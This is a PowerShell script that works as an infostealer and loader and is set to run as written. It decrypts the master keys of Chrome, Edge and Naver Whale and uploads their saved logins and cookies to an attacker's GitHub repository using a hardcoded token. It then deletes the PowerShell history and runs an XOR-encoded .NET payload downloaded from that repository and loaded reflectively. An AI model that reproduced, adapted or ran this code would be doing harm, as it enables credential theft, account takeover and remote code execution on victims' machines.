[Net.ServicePointManager]::SecurityProtocol +='tls12'

function git-uploadfile {
    param (
        $token,
        $message = '',
        $file,
        $owner,
        $repo,
        $path = '.\',
        $sha,
        [switch]$force
    )

    $path = (Join-Path $path (Split-Path $file -Leaf))

    $base64token = [System.Convert]::ToBase64String([char[]]$token)

    $headers = @{
        Authorization = 'Basic {0}' -f $base64token
    }

    if ($force -and !$sha) {
        $sha = $(
            try {
                (git-getfile -token $token -owner $owner -repo $repo -path $path).sha
            } catch {
                $null
            }
        )
    }

    $body = @{
        message = $message
        content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
        sha = $sha
    } | ConvertTo-Json

    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Body $body -Method Put
}

function CopyFile ($Array)
{
	if (!(Test-Path -Path $Array[0])) {return $False}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Login Data"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
			$destFileName = $env:APPDATA + "\LoginData_" + $Array[1] + $i
			Copy-Item $Files[$i] -Destination $destFileName -Force
			git-uploadfile -token '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' -file $destFileName -owner suthaks -repo fulank -path cycle -force
			del $destFileName
		}
	}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Login Data For Account"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
			$destFileName = $env:APPDATA + "\LoginForAccount_" + $Array[1] + $i
			Copy-Item -Path $Files[$i].FullName -Destination $destFileName -Force
			git-uploadfile -token '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' -file $destFileName -owner suthaks -repo fulank -path cycle -force
			del $destFileName
		}
	}
}

function CookieCopyFile ($Array)
{
	if (!(Test-Path -Path $Array[0])) {return $False}

	$Files = Get-ChildItem -File -Path $Array[0] -Recurse -Include "Cookies"
	if($Files)
	{
		for ($i = 0; $i -lt $Files.Count; $i++)
		{
			$destFileName = $env:APPDATA + "\Cookies_" + $Array[1] + $i
			Copy-Item $Files[$i] -Destination $destFileName -Force
			git-uploadfile -token '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' -file $destFileName -owner suthaks -repo fulank -path cycle -force
			del $destFileName
		}
	}
}

function Get-MasterKey ($Path)
{

	if (!(Test-Path -Path $Path)) {return $False}
	$FileLocalState = Get-ChildItem -File $Path -Recurse -Include "Local State"

	$localStatePath = $FileLocalState.FullName
	$localStateData = [IO.File]::ReadAllText($localStatePath)


	$keyBase64=[regex]::Match($localStateData,'(?<="encrypted_key":")(.*?)(?=")').value;
	
	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
	Add-Content -Path $outFile_masterkey -Value ("keybase : " + $keyBase64)

	$keyBytes = [System.Convert]::FromBase64String($keyBase64)
	$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
	$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)

	return [System.Convert]::ToBase64String($masterKey)
}

function Get-MasterKeyJSON ($Path)
{

	if (!(Test-Path -Path $Path)) {return $False}
	$FileLocalState = Get-ChildItem -File $Path -Recurse -Include "Local State"

	$localStatePath = $FileLocalState.FullName
	$localStateData = [IO.File]::ReadAllText($localStatePath)

	$keyBase64 = (ConvertFrom-Json $localStateData).os_crypt.encrypted_key

	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
	Add-Content -Path $outFile_masterkey -Value ("keybase : " + $keyBase64)

	$keyBytes = [System.Convert]::FromBase64String($keyBase64)
	$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
	$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)

	return [System.Convert]::ToBase64String($masterKey)
}

function main
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

	$ChromedataPath = "$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data"
	$EdgedataPath = "$($env:LOCALAPPDATA)\\Microsoft\\Edge\\User Data"
	$NaverWhaledataPath = "$($env:LOCALAPPDATA)\\Naver\\Naver Whale\\User Data"

	Add-Type -AssemblyName System.Security

	$masterkey = Get-MasterKey ($ChromedataPath)
	$outFile_masterkey = "$env:APPDATA\masterkey.txt"
	Add-Content -Path $outFile_masterkey -Value ("Chrome : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($ChromedataPath)
	Add-Content -Path $outFile_masterkey -Value ("Chrome : " + $masterkey)

	$masterkey = Get-MasterKey ($EdgedataPath)
	Add-Content -Path $outFile_masterkey -Value ("msedge : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($EdgedataPath)
	Add-Content -Path $outFile_masterkey -Value ("msedge : " + $masterkey)

	$masterkey = Get-MasterKey ($NaverWhaledataPath)
	Add-Content -Path $outFile_masterkey -Value ("NaverWhale : " + $masterkey)

	$masterkey = Get-MasterKeyJSON ($NaverWhaledataPath)
	Add-Content -Path $outFile_masterkey -Value ("NaverWhale : " + $masterkey)
	git-uploadfile -token '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' -file $outFile_masterkey -owner suthaks -repo fulank -path cycle -force

	CopyFile (@($ChromedataPath,"Chrome"))
	CopyFile (@($EdgedataPath,"msedge"))

	CookieCopyFile (@($ChromedataPath,"Chrome"))
	CookieCopyFile (@($EdgedataPath,"msedge"))
	
	$logp = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	del $logp
	
}



function qqqaaaazzz
{
	$dp = "$Env:Appdata\Microsoft\Office"
	$sgsdsh = Test-Path -Path $dp
	if(!$sgsdsh)
	{
		New-Item -ItemType Directory -Force $dp
	}

	$uytb = $env:Appdata + "\Microsoft\Office\msword16.pip"
	$pokj = "https://raw.githubusercontent.com/suthaks/fulank/main/msword16.pip"
	$oihkvd = "https://raw.githubusercontent.com/suthaks/fulank/main/tzMain.dat"
	$rtgj = "C:\windows\temp\strike.dat"
	$iiii = New-Object Net.WebClient
	$iiii.DownloadFile($oihkvd, $rtgj)
	$iiii.DownloadFile($pokj, $uytb)

	start-sleep -s 2
	$rfdcv = [System.IO.File]::ReadAllBytes($rtgj)
	del $rtgj
	$key = "0x92"
	$mk="tzM"

	for($i=0; $i -lt $rfdcv.count ; $i++)
	{
	$rfdcv[$i] = $rfdcv[$i] -bxor $key
	}

	$rfdcv[0]=200
	$rfdcv[0]=$rfdcv[0]-123
	$as=[System.Reflection.Assembly]::Load($rfdcv)

	$mk=$mk+"ain"
	foreach( $t in $as.GetTypes() )
	{
		foreach( $m in $t.GetMethods() )
		{
			if( $m.Name.Equals($mk) )
			{
				 
				$inst = [System.Activator]::CreateInstance($t)
				$m.Invoke($inst,@())
			}
		}
	}
}

main
qqqaaaazzz


